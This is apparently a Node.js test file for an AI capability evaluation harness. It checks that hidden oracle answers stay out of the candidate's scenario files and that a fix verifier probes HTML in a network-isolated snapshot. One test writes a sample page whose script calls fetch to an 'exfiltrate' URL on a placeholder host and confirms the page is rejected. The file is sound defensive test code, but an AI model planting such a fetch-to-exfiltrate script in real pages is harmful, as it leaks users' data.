"use strict";

const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");

const { runCapabilityBatch } = require("../scripts/evals/design-critique-capability-run");
const {
  assertSafePostSubject,
  validateVerifierCoverage,
  verifyPostSubject,
} = require("../evals/capabilities/design-critique/verify");

const ROOT = path.resolve(__dirname, "..");

test("dedicated capability runner executes every hidden-oracle fixture in isolation", () => {
  const outDir = fs.mkdtempSync(path.join(os.tmpdir(), "pm-capability-batch-"));
  const outPath = path.join(outDir, "repeat-1.json");
  const oracle = JSON.parse(
    fs.readFileSync(
      path.join(ROOT, "evals", "capabilities", "design-critique", "oracle.json"),
      "utf8"
    )
  );

  const result = runCapabilityBatch({
    rootDir: ROOT,
    profileId: "sol-high",
    repeat: 1,
    outPath,
    adapterOverride: "stub",
  });

  assert.equal(result.exitCode, 0, JSON.stringify(result.bundle.failures, null, 2));
  assert.equal(result.bundle.harness_only, true);
  assert.deepEqual(
    result.bundle.cases.map((item) => item.case_id).sort(),
    oracle.cases.map((item) => item.id).sort()
  );
  for (const item of result.bundle.cases) {
    const expected = oracle.cases.find((candidate) => candidate.id === item.case_id);
    assert.equal(item.fixture.sha256, expected.fixture_sha256);
    assert.equal(item.run.status, "pass");
    assert.match(item.normalized_transcript.path, /transcript\.normalized\.jsonl$/);
    assert.match(item.candidate_output.path, /quality-output\.md$/);
    assert.match(item.post_subject.path, /workdir\/ui\/design-critique\/capability-case\.html$/);

    const scenarioDir = path.join(
      ROOT,
      "eval-results",
      "capability-scenarios",
      item.run.scenario_id
    );
    const candidateScenario = ["story.md", "setup.sh", "checks.sh"]
      .map((name) => fs.readFileSync(path.join(scenarioDir, name), "utf8"))
      .join("\n");
    for (const oracleCase of oracle.cases) {
      assert.equal(candidateScenario.includes(oracleCase.id), false);
      for (const defect of oracleCase.defects) {
        assert.equal(candidateScenario.includes(defect.id), false);
        assert.equal(candidateScenario.includes(defect.fix_oracle), false);
      }
    }
  }

  for (const item of [...result.bundle.cases, ...result.bundle.failures]) {
    if (item.run?.run_id) {
      fs.rmSync(path.join(ROOT, "eval-results", "runs", item.run.run_id), {
        recursive: true,
        force: true,
      });
    }
    if (item.run?.scenario_id) {
      fs.rmSync(path.join(ROOT, "eval-results", "capability-scenarios", item.run.scenario_id), {
        recursive: true,
        force: true,
      });
    }
  }
  fs.rmSync(outDir, { recursive: true, force: true });
});

test("host fix verifier covers every hidden oracle and accepts the inert fixtures", () => {
  const oracle = JSON.parse(
    fs.readFileSync(
      path.join(ROOT, "evals", "capabilities", "design-critique", "oracle.json"),
      "utf8"
    )
  );
  assert.deepEqual(validateVerifierCoverage(oracle), []);
  for (const item of oracle.cases) {
    assert.doesNotThrow(() => assertSafePostSubject(path.join(ROOT, item.fixture_ref)), item.id);
  }
});

test("fix verification probes a private inert snapshot with outbound networking disabled", () => {
  const oracle = JSON.parse(
    fs.readFileSync(
      path.join(ROOT, "evals", "capabilities", "design-critique", "oracle.json"),
      "utf8"
    )
  );
  const item = oracle.cases.find((candidate) => candidate.id === "responsive-report");
  const sourcePath = path.join(ROOT, item.fixture_ref);
  const observed = [];
  const results = verifyPostSubject({
    oracleCase: { ...item, defects: [item.defects[0]] },
    htmlPath: sourcePath,
    browserPath: process.execPath,
    probe(configuration) {
      observed.push({ ...configuration, snapshot: fs.readFileSync(configuration.htmlPath) });
      return { stdout: "true\n" };
    },
  });

  assert.equal(results[0].status, "pass");
  assert.equal(observed[0].networkIsolation, true);
  assert.notEqual(observed[0].htmlPath, sourcePath);
  assert.deepEqual(observed[0].snapshot, fs.readFileSync(sourcePath));
  assert.equal(fs.existsSync(observed[0].htmlPath), false, "private snapshot should be removed");

  const unsafeDir = fs.mkdtempSync(path.join(os.tmpdir(), "pm-capability-unsafe-"));
  try {
    const unsafePath = path.join(unsafeDir, "subject.html");
    fs.writeFileSync(
      unsafePath,
      '<!doctype html><script>fetch("https://example.invalid/exfiltrate")</script>'
    );
    assert.throws(() => assertSafePostSubject(unsafePath), /forbidden/);
    let called = false;
    const unsafe = verifyPostSubject({
      oracleCase: { ...item, defects: [item.defects[0]] },
      htmlPath: unsafePath,
      browserPath: process.execPath,
      probe() {
        called = true;
        return { stdout: "true\n" };
      },
    });
    assert.equal(called, false);
    assert.equal(unsafe[0].status, "indeterminate");
  } finally {
    fs.rmSync(unsafeDir, { recursive: true, force: true });
  }
});
